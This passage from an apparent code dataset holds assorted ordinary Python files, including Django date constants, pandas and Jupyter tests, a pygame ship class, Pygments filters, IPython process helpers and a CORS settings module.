    async def indication(self, pdu: ConsolePDU) -> None:
        """"""
        This function is called with each line of text from the console (or
        from a file or pipe) and called with None at end-of-file.  It is
        ""downstream"" of the Console() instance and gets this ""indication"" when
        the console is making a ""request"".
        """"""
        if _debug:
            Echo._debug(""indication {!r}"".format(pdu))
        if pdu is None:
            return

        # send the uppercase content back up the stack
        await self.response(pdu.upper())


async def main() -> None:
    try:
        console = None
        args = ArgumentParser().parse_args()
        if _debug:
            _log.debug(""args: %r"", args)
            _log.debug(""settings: %r"", settings)

        # build a very small stack
        console = Console()
        echo = Echo()
        if _debug:
            _log.debug(""console, echo: %r, %r"", console, echo)

        # bind the two objects together, top down
        bind(console, echo)

        # run until the console is done, canceled or EOF
        await console.fini.wait()

    finally:
        if console and console.exit_status:
            sys.exit(console.exit_status)


if __name__ == ""__main__"":
    asyncio.run(main())"
JD104	JD104-dates.py	"""Commonly-used date structures""

from django.utils.translation import gettext_lazy as _
from django.utils.translation import pgettext_lazy

WEEKDAYS = {
    0: _(""Monday""),
    1: _(""Tuesday""),
    2: _(""Wednesday""),
    3: _(""Thursday""),
    4: _(""Friday""),
    5: _(""Saturday""),
    6: _(""Sunday""),
}
WEEKDAYS_ABBR = {
    0: _(""Mon""),
    1: _(""Tue""),
    2: _(""Wed""),
    3: _(""Thu""),
    4: _(""Fri""),
    5: _(""Sat""),
    6: _(""Sun""),
}
MONTHS = {
    1: _(""January""),
    2: _(""February""),
    3: _(""March""),
    4: _(""April""),
    5: _(""May""),
    6: _(""June""),
    7: _(""July""),
    8: _(""August""),
    9: _(""September""),
    10: _(""October""),
    11: _(""November""),
    12: _(""December""),
}
MONTHS_3 = {
    1: _(""jan""),
    2: _(""feb""),
    3: _(""mar""),
    4: _(""apr""),
    5: _(""may""),
    6: _(""jun""),
    7: _(""jul""),
    8: _(""aug""),
    9: _(""sep""),
    10: _(""oct""),
    11: _(""nov""),
    12: _(""dec""),
}
MONTHS_AP = {  # month names in Associated Press style
    1: pgettext_lazy(""abbrev. month"", ""Jan.""),
    2: pgettext_lazy(""abbrev. month"", ""Feb.""),
    3: pgettext_lazy(""abbrev. month"", ""March""),
    4: pgettext_lazy(""abbrev. month"", ""April""),
    5: pgettext_lazy(""abbrev. month"", ""May""),
    6: pgettext_lazy(""abbrev. month"", ""June""),
    7: pgettext_lazy(""abbrev. month"", ""July""),
    8: pgettext_lazy(""abbrev. month"", ""Aug.""),
    9: pgettext_lazy(""abbrev. month"", ""Sept.""),
    10: pgettext_lazy(""abbrev. month"", ""Oct.""),
    11: pgettext_lazy(""abbrev. month"", ""Nov.""),
    12: pgettext_lazy(""abbrev. month"", ""Dec.""),
}
MONTHS_ALT = {  # required for long date representation by some locales
    1: pgettext_lazy(""alt. month"", ""January""),
    2: pgettext_lazy(""alt. month"", ""February""),
    3: pgettext_lazy(""alt. month"", ""March""),
    4: pgettext_lazy(""alt. month"", ""April""),
    5: pgettext_lazy(""alt. month"", ""May""),
    6: pgettext_lazy(""alt. month"", ""June""),
    7: pgettext_lazy(""alt. month"", ""July""),
    8: pgettext_lazy(""alt. month"", ""August""),
    9: pgettext_lazy(""alt. month"", ""September""),
    10: pgettext_lazy(""alt. month"", ""October""),
    11: pgettext_lazy(""alt. month"", ""November""),
    12: pgettext_lazy(""alt. month"", ""December""),
}"
JY159	JY159-utils.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.
from __future__ import absolute_import, division, print_function

import re

from ._typing import TYPE_CHECKING, cast
from .version import InvalidVersion, Version

if TYPE_CHECKING:  # pragma: no cover
    from typing import NewType, Union

    NormalizedName = NewType(""NormalizedName"", str)

_canonicalize_regex = re.compile(r""[-_.]+"")


def canonicalize_name(name):
    # type: (str) -> NormalizedName
    # This is taken from PEP 503.
    value = _canonicalize_regex.sub(""-"", name).lower()
    return cast(""NormalizedName"", value)


def canonicalize_version(_version):
    # type: (str) -> Union[Version, str]
    """"""
    This is very similar to Version.__str__, but has one subtle difference
    with the way it handles the release segment.
    """"""

    try:
        version = Version(_version)
    except InvalidVersion:
        # Legacy versions cannot be normalized
        return _version

    parts = []

    # Epoch
    if version.epoch != 0:
        parts.append(""{0}!"".format(version.epoch))

    # Release segment
    # NB: This strips trailing '.0's to normalize
    parts.append(re.sub(r""(\.0)+$"", """", ""."".join(str(x) for x in version.release)))

    # Pre-release
    if version.pre is not None:
        parts.append("""".join(str(x) for x in version.pre))

    # Post-release
    if version.post is not None:
        parts.append("".post{0}"".format(version.post))

    # Development release
    if version.dev is not None:
        parts.append("".dev{0}"".format(version.dev))

    # Local version segment
    if version.local is not None:
        parts.append(""+{0}"".format(version.local))

    return """".join(parts)"
JD258	JD258-onu_temp_yellow_alarm.py	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from voltha.protos.events_pb2 import AlarmEventType, AlarmEventSeverity, AlarmEventCategory
from voltha.extensions.alarms.adapter_alarms import AlarmBase


class OnuTempYellowAlarm(AlarmBase):
    """"""
    The ONU Temperature Yellow Alarm is reported by both the CircuitPack
    (ME #6) and the ONT-G (ME # 256) to indicate no service shutdown at
    present, but the circuit pack is operating beyond its recommended range.

    For CircuitPack equipment alarms, the intf_id reported is that of the
    UNI's logical port number

    For ONT-G equipment alarms, the intf_id reported is that of the PON/ANI
    physical port number
    """"""
    def __init__(self, alarm_mgr, onu_id, intf_id):
        super(OnuTempYellowAlarm, self).__init__(alarm_mgr, object_type='onu temperature yellow',
                                                 alarm='ONU_TEMP_YELLOW',
                                                 alarm_category=AlarmEventCategory.ONU,
                                                 alarm_type=AlarmEventType.ENVIRONMENT,
                                                 alarm_severity=AlarmEventSeverity.MAJOR)
        self._onu_id = onu_id
        self._intf_id = intf_id

    def get_context_data(self):
        return {'onu-id': self._onu_id,
                'onu-intf-id': self._intf_id}"
JY519	JY519-FP_doppler.py	"import numpy as np
import matplotlib.pyplot as plt
import pandas as pd
import mplhep as hep
import scipy.interpolate as spi
from scipy.signal import savgol_filter
from scipy.signal import find_peaks
from scipy.signal import argrelextrema
from sklearn.preprocessing import *
hep.style.use(""CMS"")

data = pd.read_csv(r""Abs Laser\Data\08-03-2023\DopplerFP.CSV"")
data_DB_free = pd.read_csv(r""Abs Laser\Data\08-03-2023\DopplerFreeFP.CSV"")

print(data_DB_free)

x_axis = data_DB_free['in s']
c1 = data_DB_free['C1 in V']
c2 = data_DB_free['C2 in V']
c3 = data_DB_free['C3 in V']
c4 = data_DB_free['C4 in V']


c1_B = data['C1 in V']
x2 = data['in s']
print(""OG C1B len: "",len(c1_B))

c1_B = c1_B[x2 > min(x_axis)]
c1_B = c1_B[x2 < max(x_axis)]

print(""x1 diff "",np.diff(x_axis)[5])
print(""x2 diff "",np.diff(x2)[5])


x2 = x2[x2 > min(x_axis)]
x2 = x2[x2 < max(x_axis)]
print(""X data:"")
print(""Mins: "",min(x_axis),min(x2))
print(""Maxs: "",max(x_axis),max(x2))
print(""Lengths: "",len(x_axis),len(x2))

print(""C1 len: "",len(c1))
print(""C1B len: "",len(c1_B))

cubic_spline = spi.CubicSpline(x_axis,c4)
new_x = np.linspace(min(x_axis),max(x_axis),1000)
new_y = cubic_spline(new_x)
fig, ax = plt.subplots(1,2)
ax[0].plot(x_axis,c1,label=""Doppler Free"")
ax[0].plot(x_axis,c2,label=""Broad Channel"")
ax[0].plot(x_axis,c3,label=""Laser input?"")
ax[0].plot(x_axis,c4,label=""FP Channel"",alpha=0.5)
ax[0].plot(new_x,new_y,label=""Cubic Spline"",color=""black"")
ax[0].plot(x_axis,savgol_filter(c4,window_length=501,polyorder=3),label=""FP Savgol"",color='blue',ls='--')



ax[1].plot(x_axis,c1-c1_B/max(c1_B)*max(c1),label=""HF Splitting"")
ax[1].plot(x_axis,10*c4,label=""FP Channel"",alpha=1,color='red')

# ax[1].plot(x2,data['C1 in V'],label='C1')
# ax[1].plot(x2,data['C2 in V'],label='C2')
# ax[1].plot(x2,data['C3 in V'],label='C3')
# ax[1].plot(x2,data['C4 in V'],label='C4')

ax[0].legend(loc='upper right')
ax[1].legend(loc='upper right')

plt.xlabel(""Time (seconds)"")
plt.ylabel(""Voltage (V)"")
plt.legend(loc=""best"")
plt.grid(alpha=0.5)
plt.show()"
JD264	JD264-test_pon_port.py	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""""""
Adtran generic VOLTHA device handler
""""""
import pytest
from mock import MagicMock
from voltha.adapters.adtran_olt.pon_port import PonPort
from voltha.adapters.adtran_olt.adtran_olt import AdtranOltHandler


@pytest.fixture()
def simple_pon():
    parent = MagicMock(autospec=AdtranOltHandler)
    parent.__str__.return_value = 'test-olt'
    yield PonPort(parent=parent,
                  port_no=1,
                  **{
                      'pon-id': 2  # TODO: This is a kinda crumby API
                  })


def test_properties(simple_pon):
    assert simple_pon.pon_id == 2
    assert simple_pon.onus == frozenset()
    assert simple_pon.onu_ids == frozenset()
    assert simple_pon.onu(12345) is None
    assert simple_pon.in_service_onus == 0
    assert simple_pon.closest_onu_distance == -1
    assert simple_pon.downstream_fec_enable is True
    assert simple_pon.upstream_fec_enable is True
    assert simple_pon.any_upstream_fec_enabled is False
    assert simple_pon.mcast_aes is False
    assert simple_pon.deployment_range == 25000
    assert simple_pon.discovery_tick == 200.0
    assert simple_pon.activation_method == 'autoactivate'
    assert simple_pon.authentication_method == 'serial-number'
    assert 'PonPort-pon-2: Admin: 3, Oper: 1, OLT: test-olt' == str(simple_pon)


def test_get_port(simple_pon):
    port = simple_pon.get_port()
    assert """"""port_no: 1
label: ""pon-2""
type: PON_OLT
admin_state: ENABLED
oper_status: DISCOVERED
"""""" == str(port)"
JY96	JY96-_windows.py	"import sys
from dataclasses import dataclass


@dataclass
class WindowsConsoleFeatures:
    """"""Windows features available.""""""

    vt: bool = False
    """"""The console supports VT codes.""""""
    truecolor: bool = False
    """"""The console supports truecolor.""""""


try:
    import ctypes
    from ctypes import LibraryLoader, wintypes

    if sys.platform == ""win32"":
        windll = LibraryLoader(ctypes.WinDLL)
    else:
        windll = None
        raise ImportError(""Not windows"")
except (AttributeError, ImportError, ValueError):
    # Fallback if we can't load the Windows DLL
    def get_windows_console_features() -> WindowsConsoleFeatures:
        features = WindowsConsoleFeatures()
        return features

else:
    STDOUT = -11
    ENABLE_VIRTUAL_TERMINAL_PROCESSING = 4
    _GetConsoleMode = windll.kernel32.GetConsoleMode
    _GetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]
    _GetConsoleMode.restype = wintypes.BOOL

    _GetStdHandle = windll.kernel32.GetStdHandle
    _GetStdHandle.argtypes = [
        wintypes.DWORD,
    ]
    _GetStdHandle.restype = wintypes.HANDLE

    def get_windows_console_features() -> WindowsConsoleFeatures:
        """"""Get windows console features.

        Returns:
            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.
        """"""
        handle = _GetStdHandle(STDOUT)
        console_mode = wintypes.DWORD()
        result = _GetConsoleMode(handle, console_mode)
        vt = bool(result and console_mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING)
        truecolor = False
        if vt:
            win_version = sys.getwindowsversion()
            truecolor = win_version.major > 10 or (
                win_version.major == 10 and win_version.build >= 15063
            )
        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)
        return features


if __name__ == ""__main__"":
    import platform

    features = get_windows_console_features()
    from pip._vendor.rich import print

    print(f'platform=""{platform.system()}""')
    print(repr(features))"
JY169	JY169-test_multiselect_toggle.py	"INITIAL_CELLS = ['print(""a"")', 'print(""b"")', 'print(""c"")']
def test_multiselect_toggle(prefill_notebook):
    notebook = prefill_notebook(INITIAL_CELLS)
    def extend_selection_by(delta):
        notebook.browser.execute_script(
            ""Jupyter.notebook.extend_selection_by(arguments[0]);"", delta)

    def n_selected_cells():
        return notebook.browser.execute_script(
            ""return Jupyter.notebook.get_selected_cells().length;"")

    def select_cells():
        notebook.focus_cell(0)
        extend_selection_by(2)

    # Test that cells, which start off not collapsed, are collapsed after
    # calling the multiselected cell toggle.
    select_cells()
    assert n_selected_cells() == 3
    notebook.browser.execute_script(""Jupyter.notebook.execute_selected_cells();"")
    select_cells()
    notebook.browser.execute_script(""Jupyter.notebook.toggle_cells_outputs();"")
    cell_output_states = notebook.browser.execute_script(
        ""return Jupyter.notebook.get_cells().map(c => c.collapsed)"")
    assert cell_output_states == [False] * 3, ""ensure that all cells are not collapsed""

    # Test that cells, which start off not scrolled are scrolled after
    # calling the multiselected scroll toggle.
    select_cells()
    assert n_selected_cells() == 3
    notebook.browser.execute_script(""Jupyter.notebook.toggle_cells_outputs_scroll();"")
    cell_scrolled_states = notebook.browser.execute_script(
        ""return Jupyter.notebook.get_cells().map(c => c.output_area.scroll_state)"")
    assert all(cell_scrolled_states), ""ensure that all have scrolling enabled""

    # Test that cells, which start off not cleared are cleared after
    # calling the multiselected scroll toggle.
    select_cells()
    assert n_selected_cells() == 3
    notebook.browser.execute_script(""Jupyter.notebook.clear_cells_outputs();"")
    cell_outputs_cleared = notebook.browser.execute_script(
        ""return Jupyter.notebook.get_cells().map(c => c.output_area.element.html())"")
    assert cell_outputs_cleared == [""""] * 3, ""ensure that all cells are cleared"""
JY558	JY558-ship.py	"import pygame


class Ship():
    """"""Класс для управления кораблем.""""""

    def __init__(self, ai_game):
        """"""Инициализирует корабль и задает его начальную позицию.""""""
        self.screen = ai_game.screen
        self.settings = ai_game.settings
        self.screen_rect = ai_game.screen.get_rect()

        # Загружает изображение корабля и получает прямоугольник.
        self.image = pygame.image.load('images/ship.bmp')
        self.rect = self.image.get_rect()
        # Каждый новый корабль появляется у нижнего края экрана.
        self.rect.midbottom = self.screen_rect.midbottom

        # Сохранение вещественной координаты центра корабля.
        self.x = float(self.rect.x)

        # Флаги перемещения
        self.moving_right = False
        self.moving_left = False

    def update(self):
        """"""Обновляет позицию корабля с учетом флагов.""""""
        if self.moving_right and self.rect.right < self.screen_rect.right:
            self.x += self.settings.ship_speed_factor
        if self.moving_left and self.rect.left > 0:
            self.x -= self.settings.ship_speed_factor

        # Обновление атрибута rect на основании self.x.
        self.rect.x = self.x

    def blitme(self):
        """"""Рисует корабль в текущей позиции.""""""
        self.screen.blit(self.image, self.rect)

    def center_ship(self):
        """"""Размещает корабль в центре нижней стороны.""""""
        self.rect.midbottom = self.screen_rect.midbottom
        self.x = float(self.rect.x)"
JD168	JD168-utils.py	"import inspect
import itertools
from collections import OrderedDict

from decorator import decorator


class ValidationFailure(Exception):
    def __init__(self, func, args):
        self.func = func
        self.__dict__.update(args)

    def __repr__(self):
        return u'ValidationFailure(func={func}, args={args})'.format(
            func=self.func.__name__,
            args=dict(
                [(k, v) for (k, v) in self.__dict__.items() if k != 'func']
            )
        )

    def __str__(self):
        return repr(self)

    def __unicode__(self):
        return repr(self)

    def __bool__(self):
        return False

    def __nonzero__(self):
        return False


def func_args_as_dict(func, args, kwargs):
    """"""
    Return given function's positional and key value arguments as an ordered
    dictionary.
    """"""
    _getargspec = inspect.getfullargspec

    arg_names = list(
        OrderedDict.fromkeys(
            itertools.chain(
                _getargspec(func)[0],
                kwargs.keys()
            )
        )
    )
    return OrderedDict(
        list(zip(arg_names, args)) +
        list(kwargs.items())
    )


def validator(func, *args, **kwargs):
    """"""
    A decorator that makes given function validator.

    Whenever the given function is called and returns ``False`` value
    this decorator returns :class:`ValidationFailure` object.

    Example::

        >>> @validator
        ... def even(value):
        ...     return not (value % 2)

        >>> even(4)
        True

        >>> even(5)
        ValidationFailure(func=even, args={'value': 5})

    :param func: function to decorate
    :param args: positional function arguments
    :param kwargs: key value function arguments
    """"""
    def wrapper(func, *args, **kwargs):
        value = func(*args, **kwargs)
        if not value:
            return ValidationFailure(
                func, func_args_as_dict(func, args, kwargs)
            )
        return True
    return decorator(wrapper, func)"
JD229	JD229-test_reduction.py	"import numpy as np
import pytest

import pandas as pd


@pytest.fixture
def data():
    """"""Fixture returning boolean array, with valid and missing values.""""""
    return pd.array(
        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],
        dtype=""boolean"",
    )


@pytest.mark.parametrize(
    ""values, exp_any, exp_all, exp_any_noskip, exp_all_noskip"",
    [
        ([True, pd.NA], True, True, True, pd.NA),
        ([False, pd.NA], False, False, pd.NA, False),
        ([pd.NA], False, True, pd.NA, pd.NA),
        ([], False, True, False, True),
        # GH-33253: all True / all False values buggy with skipna=False
        ([True, True], True, True, True, True),
        ([False, False], False, False, False, False),
    ],
)
def test_any_all(values, exp_any, exp_all, exp_any_noskip, exp_all_noskip):
    # the methods return numpy scalars
    exp_any = pd.NA if exp_any is pd.NA else np.bool_(exp_any)
    exp_all = pd.NA if exp_all is pd.NA else np.bool_(exp_all)
    exp_any_noskip = pd.NA if exp_any_noskip is pd.NA else np.bool_(exp_any_noskip)
    exp_all_noskip = pd.NA if exp_all_noskip is pd.NA else np.bool_(exp_all_noskip)

    for con in [pd.array, pd.Series]:
        a = con(values, dtype=""boolean"")
        assert a.any() is exp_any
        assert a.all() is exp_all
        assert a.any(skipna=False) is exp_any_noskip
        assert a.all(skipna=False) is exp_all_noskip

        assert np.any(a.any()) is exp_any
        assert np.all(a.all()) is exp_all


@pytest.mark.parametrize(""dropna"", [True, False])
def test_reductions_return_types(dropna, data, all_numeric_reductions):
    op = all_numeric_reductions
    s = pd.Series(data)
    if dropna:
        s = s.dropna()

    if op == ""sum"":
        assert isinstance(getattr(s, op)(), np.int_)
    elif op == ""prod"":
        assert isinstance(getattr(s, op)(), np.int_)
    elif op in (""min"", ""max""):
        assert isinstance(getattr(s, op)(), np.bool_)
    else:
        # ""mean"", ""std"", ""var"", ""median"", ""kurt"", ""skew""
        assert isinstance(getattr(s, op)(), np.float64)"
JD219	JD219-__init__.py	"import sys


class VendorImporter:
    """"""
    A PEP 302 meta path importer for finding optionally-vendored
    or otherwise naturally-installed packages from root_name.
    """"""

    def __init__(self, root_name, vendored_names=(), vendor_pkg=None):
        self.root_name = root_name
        self.vendored_names = set(vendored_names)
        self.vendor_pkg = vendor_pkg or root_name.replace('extern', '_vendor')

    @property
    def search_path(self):
        """"""
        Search first the vendor package then as a natural package.
        """"""
        yield self.vendor_pkg + '.'
        yield ''

    def find_module(self, fullname, path=None):
        """"""
        Return self when fullname starts with root_name and the
        target module is one vendored through this importer.
        """"""
        root, base, target = fullname.partition(self.root_name + '.')
        if root:
            return
        if not any(map(target.startswith, self.vendored_names)):
            return
        return self

    def load_module(self, fullname):
        """"""
        Iterate over the search path to locate and load fullname.
        """"""
        root, base, target = fullname.partition(self.root_name + '.')
        for prefix in self.search_path:
            try:
                extant = prefix + target
                __import__(extant)
                mod = sys.modules[extant]
                sys.modules[fullname] = mod
                return mod
            except ImportError:
                pass
        else:
            raise ImportError(
                ""The '{target}' package is required; ""
                ""normally this is bundled with this package so if you get ""
                ""this warning, consult the packager of your ""
                ""distribution."".format(**locals())
            )

    def install(self):
        """"""
        Install this importer into sys.meta_path if not already present.
        """"""
        if self not in sys.meta_path:
            sys.meta_path.append(self)


names = 'packaging', 'pyparsing', 'six', 'appdirs'
VendorImporter(__name__, names).install()"
JY532	JY532-test_time_series.py	"import datetime

import numpy as np
import pytest

from pandas import (
    DataFrame,
    Series,
    _testing as tm,
)
from pandas.tests.io.pytables.common import ensure_clean_store

pytestmark = pytest.mark.single_cpu


def test_store_datetime_fractional_secs(setup_path):

    with ensure_clean_store(setup_path) as store:
        dt = datetime.datetime(2012, 1, 2, 3, 4, 5, 123456)
        series = Series([0], [dt])
        store[""a""] = series
        assert store[""a""].index[0] == dt


def test_tseries_indices_series(setup_path):

    with ensure_clean_store(setup_path) as store:
        idx = tm.makeDateIndex(10)
        ser = Series(np.random.randn(len(idx)), idx)
        store[""a""] = ser
        result = store[""a""]

        tm.assert_series_equal(result, ser)
        assert result.index.freq == ser.index.freq
        tm.assert_class_equal(result.index, ser.index, obj=""series index"")

        idx = tm.makePeriodIndex(10)
        ser = Series(np.random.randn(len(idx)), idx)
        store[""a""] = ser
        result = store[""a""]

        tm.assert_series_equal(result, ser)
        assert result.index.freq == ser.index.freq
        tm.assert_class_equal(result.index, ser.index, obj=""series index"")


def test_tseries_indices_frame(setup_path):

    with ensure_clean_store(setup_path) as store:
        idx = tm.makeDateIndex(10)
        df = DataFrame(np.random.randn(len(idx), 3), index=idx)
        store[""a""] = df
        result = store[""a""]

        tm.assert_frame_equal(result, df)
        assert result.index.freq == df.index.freq
        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")

        idx = tm.makePeriodIndex(10)
        df = DataFrame(np.random.randn(len(idx), 3), idx)
        store[""a""] = df
        result = store[""a""]

        tm.assert_frame_equal(result, df)
        assert result.index.freq == df.index.freq
        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")"
JY485	JY485-inspect.py	"import inspect


def get_func_args(func):
    sig = inspect.signature(func)
    return [
        arg_name for arg_name, param in sig.parameters.items()
        if param.kind == inspect.Parameter.POSITIONAL_OR_KEYWORD
    ]


def get_func_full_args(func):
    """"""
    Return a list of (argument name, default value) tuples. If the argument
    does not have a default value, omit it in the tuple. Arguments such as
    *args and **kwargs are also included.
    """"""
    sig = inspect.signature(func)
    args = []
    for arg_name, param in sig.parameters.items():
        name = arg_name
        # Ignore 'self'
        if name == 'self':
            continue
        if param.kind == inspect.Parameter.VAR_POSITIONAL:
            name = '*' + name
        elif param.kind == inspect.Parameter.VAR_KEYWORD:
            name = '**' + name
        if param.default != inspect.Parameter.empty:
            args.append((name, param.default))
        else:
            args.append((name,))
    return args


def func_accepts_kwargs(func):
    return any(
        p for p in inspect.signature(func).parameters.values()
        if p.kind == p.VAR_KEYWORD
    )


def func_accepts_var_args(func):
    """"""
    Return True if function 'func' accepts positional arguments *args.
    """"""
    return any(
        p for p in inspect.signature(func).parameters.values()
        if p.kind == p.VAR_POSITIONAL
    )


def method_has_no_args(meth):
    """"""Return True if a method only accepts 'self'.""""""
    count = len([
        p for p in inspect.signature(meth).parameters.values()
        if p.kind == p.POSITIONAL_OR_KEYWORD
    ])
    return count == 0 if inspect.ismethod(meth) else count == 1


def func_supports_parameter(func, parameter):
    return parameter in inspect.signature(func).parameters"
JD45	JD45-filter.py	"""""""
    pygments.filter
    ~~~~~~~~~~~~~~~

    Module that implements the default filter.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""


def apply_filters(stream, filters, lexer=None):
    """"""
    Use this method to apply an iterable of filters to
    a stream. If lexer is given it's forwarded to the
    filter, otherwise the filter receives `None`.
    """"""
    def _apply(filter_, stream):
        yield from filter_.filter(lexer, stream)
    for filter_ in filters:
        stream = _apply(filter_, stream)
    return stream


def simplefilter(f):
    """"""
    Decorator that converts a function into a filter::

        @simplefilter
        def lowercase(self, lexer, stream, options):
            for ttype, value in stream:
                yield ttype, value.lower()
    """"""
    return type(f.__name__, (FunctionFilter,), {
        '__module__': getattr(f, '__module__'),
        '__doc__': f.__doc__,
        'function': f,
    })


class Filter:
    """"""
    Default filter. Subclass this class or use the `simplefilter`
    decorator to create own filters.
    """"""

    def __init__(self, **options):
        self.options = options

    def filter(self, lexer, stream):
        raise NotImplementedError()


class FunctionFilter(Filter):
    """"""
    Abstract class used by `simplefilter` to create simple
    function filters on the fly. The `simplefilter` decorator
    automatically creates subclasses of this class for
    functions passed to it.
    """"""
    function = None

    def __init__(self, **options):
        if not hasattr(self, 'function'):
            raise TypeError('%r used without bound function' %
                            self.__class__.__name__)
        Filter.__init__(self, **options)

    def filter(self, lexer, stream):
        # pylint: disable=not-callable
        yield from self.function(lexer, stream, self.options)"
JY209	JY209-process.py	"# encoding: utf-8
""""""
Utilities for working with external processes.
""""""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.


import os
import shutil
import sys

if sys.platform == 'win32':
    from ._process_win32 import system, getoutput, arg_split, check_pid
elif sys.platform == 'cli':
    from ._process_cli import system, getoutput, arg_split, check_pid
else:
    from ._process_posix import system, getoutput, arg_split, check_pid

from ._process_common import getoutputerror, get_output_error_code, process_handler


class FindCmdError(Exception):
    pass


def find_cmd(cmd):
    """"""Find absolute path to executable cmd in a cross platform manner.

    This function tries to determine the full path to a command line program
    using `which` on Unix/Linux/OS X and `win32api` on Windows.  Most of the
    time it will use the version that is first on the users `PATH`.

    Warning, don't use this to find IPython command line programs as there
    is a risk you will find the wrong one.  Instead find those using the
    following code and looking for the application itself::

        import sys
        argv = [sys.executable, '-m', 'IPython']

    Parameters
    ----------
    cmd : str
        The command line program to look for.
    """"""
    path = shutil.which(cmd)
    if path is None:
        raise FindCmdError('command could not be found: %s' % cmd)
    return path


def abbrev_cwd():
    """""" Return abbreviated version of cwd, e.g. d:mydir """"""
    cwd = os.getcwd().replace('\\','/')
    drivepart = ''
    tail = cwd
    if sys.platform == 'win32':
        if len(cwd) < 4:
            return cwd
        drivepart,tail = os.path.splitdrive(cwd)


    parts = tail.split('/')
    if len(parts) > 2:
        tail = '/'.join(parts[-2:])

    return (drivepart + (
        cwd == '/' and '/' or tail))"
JD61	JD61-get_hash_from_file.py	"#!/usr/bin/env python3

import sys

def get_pkg_hash_from_Packages(Packages_file, package, version, hash=""SHA256""):
    with open(Packages_file, 'r') as Packages:
        package_list = Packages.read().split('\n\n')
    for pkg in package_list:
        if pkg.split('\n')[0] == ""Package: ""+package:
            for line in pkg.split('\n'):
                # Assuming Filename: comes before Version:
                if line.startswith('Filename:'):
                    print(line.split("" "")[1] + "" "")
                elif line.startswith('Version:'):
                    if line != 'Version: '+version:
                        # Seems the repo contains the wrong version, or several versions
                        # We can't use this one so continue looking
                        break
                elif line.startswith(hash):
                    print(line.split("" "")[1])
                    break

def get_Packages_hash_from_Release(Release_file, arch, component, hash=""SHA256""):
    string_to_find = component+'/binary-'+arch+'/Packages'
    with open(Release_file, 'r') as Release:
        hash_list = Release.readlines()
    for i in range(len(hash_list)):
        if hash_list[i].startswith(hash+':'):
            break
    for j in range(i, len(hash_list)):
        if string_to_find in hash_list[j].strip(' '):
            print(hash_list[j].strip(' ').split(' ')[0])
            break

if __name__ == '__main__':
    if len(sys.argv) < 2:
        sys.exit('Too few arguments, I need the path to a Packages file, a package name and a version, or an InRelease file, an architecture and a component name. Exiting')

    if sys.argv[1].endswith('Packages'):
        get_pkg_hash_from_Packages(sys.argv[1], sys.argv[2], sys.argv[3])
    elif sys.argv[1].endswith(('InRelease', 'Release')):
        get_Packages_hash_from_Release(sys.argv[1], sys.argv[2], sys.argv[3])
    else:
        sys.exit(sys.argv[1]+' does not seem to be a path to a Packages or InRelease/Release file')"
JD433	JD433-test_polls.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from django.test import Client, TestCase  # noqa: 401
from django.urls import reverse
from django.utils import timezone

from .models import Choice, Question


class PollViewTests(TestCase):
    def setUp(self):
        question = Question(
            question_text=""This is a test question"",
            pub_date=timezone.now()
        )
        question.save()
        self.question = question

        choice = Choice(
            choice_text=""This is a test choice"",
            votes=0
        )
        choice.question = question
        choice.save()
        self.choice = choice

        self.client = Client()

    def test_index_view(self):
        response = self.client.get('/')
        assert response.status_code == 200
        assert self.question.question_text in str(response.content)

    def test_detail_view(self):
        response = self.client.get(
            reverse('polls:detail', args=(self.question.id,)))
        assert response.status_code == 200
        assert self.question.question_text in str(response.content)
        assert self.choice.choice_text in str(response.content)

    def test_results_view(self):
        response = self.client.get(
            reverse('polls:results', args=(self.question.id,)))
        assert response.status_code == 200
        assert self.question.question_text in str(response.content)
        assert self.choice.choice_text in str(response.content)"
JD404	JD404-conf.py	"from __future__ import annotations

from typing import cast
from typing import List
from typing import Pattern
from typing import Sequence
from typing import Tuple
from typing import Union

from django.conf import settings

from corsheaders.defaults import default_headers
from corsheaders.defaults import default_methods

# Kept here for backwards compatibility


class Settings:
    """"""
    Shadow Django's settings with a little logic
    """"""

    @property
    def CORS_ALLOW_HEADERS(self) -> Sequence[str]:
        return getattr(settings, ""CORS_ALLOW_HEADERS"", default_headers)

    @property
    def CORS_ALLOW_METHODS(self) -> Sequence[str]:
        return getattr(settings, ""CORS_ALLOW_METHODS"", default_methods)

    @property
    def CORS_ALLOW_CREDENTIALS(self) -> bool:
        return getattr(settings, ""CORS_ALLOW_CREDENTIALS"", False)

    @property
    def CORS_PREFLIGHT_MAX_AGE(self) -> int:
        return getattr(settings, ""CORS_PREFLIGHT_MAX_AGE"", 86400)

    @property
    def CORS_ALLOW_ALL_ORIGINS(self) -> bool:
        return getattr(
            settings,
            ""CORS_ALLOW_ALL_ORIGINS"",
            getattr(settings, ""CORS_ORIGIN_ALLOW_ALL"", False),
        )

